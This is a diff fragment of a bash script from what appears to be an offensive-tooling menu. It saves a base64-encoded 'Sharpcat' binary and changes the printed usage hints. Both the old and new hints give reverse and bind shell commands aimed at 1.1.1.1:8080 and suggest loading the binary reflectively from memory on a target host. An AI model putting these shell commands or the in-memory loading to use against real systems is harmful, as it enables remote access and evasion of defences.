@@ -1244,9 +1244,9 @@ case $1 in
             echo -n $Sharpcatbin > $PWD/sc.enc
             echo "Saving $1: $PWD/sc.enc"
             yellowprint "Usage:" 
-            yellowprint "Bind: re.exe tcp listen 0.0.0.0 8080"
-            yellowprint "Reverse: re.exe tcp connect 1.1.1.1 8080"
-            yellowprint "Or load it and execute it from memory on host, by using loader in main menu: 15) Reflective C# Shell"
+            yellowprint "It is default base64 encoded. You can decode it and run it directly on a host as exe." 
+            yellowprint "Sharpcat.exe 1.1.1.1 8080"
+            yellowprint "Or load it and execute it from memory on host, by using loader in the powershell menu: 8) Reflective loading Sharpcat"
             echo
             read -p "Press enter to go back to the main menu"
             mainmenu
@@ -1254,9 +1254,9 @@ case $1 in
         *)
             echo -n $Sharpcatbin > $ans/sc.enc
             echo "Saving $1: $ans/sc.enc"
-            yellowprint "Usage:" 
-            yellowprint "re.exe tcp connect 1.1.1.1 8080"
-            yellowprint "Or load it and execute it from memory on host, by using loader in main menu: 15) Reflective C# Shell"
+            yellowprint "It is default base64 encoded. You can decode it and run it directly on a host as exe" 
+            yellowprint "Sharpcat.exe 1.1.1.1 8080"
+            yellowprint "Or load it and execute it from memory on host, by using loader in the powershell menu: 8) Reflective loading Sharpcat"
             echo
             read -p "Press enter to go back to the main menu"
             mainmenu
